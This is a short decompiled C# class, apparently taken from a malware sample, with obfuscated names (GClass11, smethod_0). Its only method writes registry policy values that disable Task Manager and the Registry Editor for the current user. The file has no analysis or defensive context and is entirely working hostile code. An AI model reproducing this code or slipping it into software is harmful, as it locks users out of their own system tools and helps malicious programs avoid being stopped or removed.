using System;
using Microsoft.Win32;

// Token: 0x0200002C RID: 44
public class GClass11
{
	// Token: 0x060000C4 RID: 196 RVA: 0x00002A1F File Offset: 0x00000C1F
	public static void smethod_0()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		registryKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		registryKey.Close();
	}
}
